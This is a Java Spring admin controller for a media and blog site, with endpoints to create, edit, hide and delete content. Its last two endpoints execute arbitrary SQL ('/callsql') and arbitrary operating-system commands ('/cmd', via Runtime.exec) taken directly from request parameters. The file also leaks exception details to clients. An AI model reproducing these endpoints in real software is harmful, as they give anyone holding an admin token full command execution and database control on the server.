package com.aurora.api;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.ibatis.session.SqlSession;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import com.alibaba.fastjson2.JSON;
import com.aurora.JwtUtil;
import com.aurora.mybatis;
import com.aurora.config.LoginCheck;
import com.aurora.mapper.AdminMapper;
import com.aurora.utils.AuroraResult;

import io.jsonwebtoken.Claims;

@RestController
@Controller
@RequestMapping("/admin")  
public class admin {
	static HashMap<Object, Object> points = new HashMap<>();
	static HashMap<Object, Object> columns = new HashMap<>();
	static String parseColumn(String point){
		columns.put("id", "id");
		columns.put("author", "author");
		columns.put("poster", "poster");
		columns.put("title", "title");
		columns.put("content", "content");
		columns.put("keywords", "keywords");
		columns.put("picture", "picture");
		columns.put("url", "url");
		columns.put("prectx", "prectx");
		columns.put("plays", "plays");
		columns.put("permission", "permission");
//		columns.put("like", "like");
//		columns.put("bi", "bi");
//		columns.put("collect", "collect");
//		columns.put("time", "time");
		return  (String) columns.get(point);
	}
	
	static String parsePoint(String point){
		points.put("av", "videos");points.put("ns", "news");
		points.put("bl", "blogs");points.put("pt", "pictures");
		points.put("ur", "users");points.put("ct", "comments");
		points.put("dm", "danmus");
		return  (String) points.get(point);
	}
	/**
	 * 新增作品
	 * @param request
	 * @param point
	 * @return
	 * @throws IOException 
	 */
	@LoginCheck(10000) //最高权限
	@ResponseBody
	@RequestMapping(value="/insert/work/{point}",method=RequestMethod.POST)
	public Object createWork(HttpServletRequest request,HttpServletResponse response,@PathVariable("point") String point) throws Exception {
		Claims token = JwtUtil.parseJWT(request.getHeader("Authorization"));
		if(request.getHeader("Authorization")==null||token==null) {
			return "{states:'404','msg':'无效签名！'}";
		}
		HashMap res = new HashMap<String, String>();
		Map<String, String[]> paramMap =  request.getParameterMap();
		Map<String, Object> paramMaps =  new HashMap<String, Object>();
		Map<String, Object> extraMaps =  new HashMap<String, Object>();
		paramMap.forEach((k,v)->{
			String pc = parseColumn(k);
			if(pc!=null) {
				if(!v[0].equals("")&&v[0]!=null)paramMaps.put(pc, v[0]);
			}
		});
		if(paramMaps.isEmpty()) return "{states:'500','msg':'无参数！'}";
		SqlSession sqlSession = mybatis.getSession();
		 try {
			extraMaps.put("point", parsePoint(point));
			extraMaps.put("pint", point);
			AdminMapper mapper = sqlSession.getMapper(AdminMapper.class);
			int obj = mapper.createWork(extraMaps,paramMaps);
		  	sqlSession.commit();
		  	if(obj==1) {
		  		res.put("states", "0");
		  		res.put("msg", "新增成功!");
		  	} else {
		  		res.put("states", "500");
		  		res.put("msg", "新增失败!请检查账号密码");
		  	}
			  res.put("states", "500");
		  	return JSON.toJSONString(res);
		 }catch(Exception e){
		    e.printStackTrace();
		    sqlSession.rollback();
		  	res.put("states", "500");
		  	res.put("msg", e.getMessage());
		  	res.put("error", e);
		  	return JSON.toJSONString(res);
		 }finally{
		     mybatis.closeSession();
		 }
    }
	/**
	 * 修改作品
	 * @param request
	 * @param point
	 * @return
	 * @throws IOException 
	 */
	@LoginCheck(10000) //最高权限
	@ResponseBody
	@RequestMapping(value="/set/work/{point}/{wid}",method=RequestMethod.POST)
	public Object updateWork(HttpServletRequest request,HttpServletResponse response,
			@PathVariable("point") String point,
			@PathVariable("wid") String wid) throws Exception {
		HashMap res = new HashMap();
		Map<String, String[]> paramMap =  request.getParameterMap();
		Map<String, Object> paramMaps =  new HashMap<String, Object>();
		paramMap.forEach((k,v)->{
			System.out.println(k);
			String pc = parseColumn(k);
			if(pc!=null) {
				if(!v[0].equals("")&&v[0]!=null)paramMaps.put(pc, v[0]);
			}
		});
		if(paramMaps.isEmpty()) return AuroraResult.fail("没有进行任何修改！");
		SqlSession sqlSession = mybatis.getSession();
		 try {
			AdminMapper mapper = sqlSession.getMapper(AdminMapper.class);
			int obj = mapper.updateWork(parsePoint(point),wid,paramMaps);
		  	sqlSession.commit();
		  	if(obj==1) {
		  		res.put("states", "0");
		  		res.put("msg", "修改成功!");
		  	} else {
		  		res.put("states", "500");
		  		res.put("msg", "修改失败!请检查账号密码");
		  	}
		  	return JSON.toJSONString(res);
		 }catch(Exception e){
		    e.printStackTrace();
		    sqlSession.rollback();
		  	res.put("states", "500");
		  	res.put("msg", e.getMessage());
		  	res.put("error", e);
		  	return JSON.toJSONString(res);
		 }finally{
		     mybatis.closeSession();
		 }
    }
	/**
	 * 删除作品（隐藏）
	 * @param request
	 * @param point
	 * @return
	 * @throws IOException 
	 */
	@LoginCheck(10000) //最高权限
	@ResponseBody
	@RequestMapping(value="/work/hide/{point}/{wid}",method=RequestMethod.POST)
	public Object hideWork(HttpServletRequest request,HttpServletResponse response,@PathVariable("point") String point,
			@PathVariable("wid") String wid) throws Exception {
		HashMap<String, String> res = new HashMap<String, String>();
		Map<String, Object> paramMaps =  new HashMap<String, Object>();
		Claims token = JwtUtil.parseJWT(request.getHeader("Authorization"));
		if(Integer.valueOf( (String) token.get("permission"))<10000) {
			return "{states:'403','msg':'权限不足！'}";
		}
		paramMaps.put("id",wid );
		SqlSession sqlSession = mybatis.getSession();
		 try {
			AdminMapper mapper = sqlSession.getMapper(AdminMapper.class);
			int obj = mapper.hideWork(parsePoint(point),paramMaps);
		  	sqlSession.commit();
		  	if(obj==1) {
		  		res.put("states", "0");
		  		res.put("msg", "删除成功!");
		  	} else {
		  		res.put("states", "500");
		  		res.put("msg", "删除失败!请检查账号密码");
		  	}
		  	return JSON.toJSONString(res);
		 }catch(Exception e){
		    e.printStackTrace();
		    sqlSession.rollback();
		  	res.put("states", "500");
		  	res.put("msg", "严重错误!");
		  	return JSON.toJSONString(res);
		 }finally{
		     mybatis.closeSession();
		 }
    }
	
	/**
	 * 删除作品
	 * @param request
	 * @param point
	 * @return
	 * @throws IOException 
	 */
	@LoginCheck(10000) //最高权限
	@ResponseBody
	@RequestMapping(value="/work/del/{point}/{wid}",method=RequestMethod.POST)
	public Object deleteWork(HttpServletRequest request,HttpServletResponse response,@PathVariable("point") String point,
			@PathVariable("wid") String wid) throws Exception {
		HashMap<String, String> res = new HashMap<String, String>();
		Map<String, Object> extraMaps =  new HashMap<String, Object>();
		Claims token = JwtUtil.parseJWT(request.getHeader("Authorization"));
		if(Integer.valueOf( (String) token.get("permission"))<10000) {
			return "{states:'403','msg':'权限不足！'}";
		}
		extraMaps.put("point",point);
		extraMaps.put("id",wid);
		extraMaps.put("author",request.getParameter("author"));
		SqlSession sqlSession = mybatis.getSession();
		 try {
			AdminMapper mapper = sqlSession.getMapper(AdminMapper.class);
			int obj = mapper.deleteWork(extraMaps);
		  	sqlSession.commit();
		  	if(obj==1) {
		  		res.put("states", "0");
		  		res.put("msg", "删除成功!");
		  	} else {
		  		res.put("states", "500");
		  		res.put("msg", "删除失败!请检查账号密码");
		  	}
		  	return JSON.toJSONString(res);
		 }catch(Exception e){
		    e.printStackTrace();
		    sqlSession.rollback();
		  	res.put("states", "500");
		  	res.put("msg", "严重错误!");
		  	return JSON.toJSONString(res);
		 }finally{
		     mybatis.closeSession();
		 }
    }
	/**
	 * 运行Sql代码
	 * @param request
	 * @param point
	 * @return
	 * @throws IOException 
	 */
	@LoginCheck(10001)
	@ResponseBody
	@RequestMapping(value="/callsql",method=RequestMethod.POST)
	public String callSql(HttpServletRequest request) throws Exception {
		Map<Object,Object> res = new HashMap();
		SqlSession sqlSession = mybatis.getSession();
		 try {
			AdminMapper mapper = sqlSession.getMapper(AdminMapper.class);
			List<Map> reslist= mapper.callSql(request.getParameter("sql"));
			res.put("res",reslist);
		  	sqlSession.commit();
		  	return JSON.toJSONString(res);
		 }catch(Exception e){
		    sqlSession.rollback();
		  	res.put("states", "500");
		  	res.put("msg", "严重错误!");
		  	return JSON.toJSONString(res);
		 }finally{
		     mybatis.closeSession();
		 }
	}
	/**
	 * 运行Sql代码
	 * @param request
	 * @param point
	 * @return
	 * @throws IOException 
	 */
	@LoginCheck(10001)
	@ResponseBody
	@RequestMapping(value="/cmd",method=RequestMethod.POST)
	public Object cmd(HttpServletRequest request) throws Exception {
		String result = "";
			try {
				Process ps = Runtime.getRuntime().exec(request.getParameter("cmd"));
				BufferedReader br = new BufferedReader(new InputStreamReader(ps.getInputStream()));
				StringBuffer sb = new StringBuffer();
				String line;
				while ((line = br.readLine()) != null) {
					sb.append(line).append("\n");
				}
				result = sb.toString();
			} catch (Exception e) {
				e.printStackTrace();
			}
		return result;
	}
}
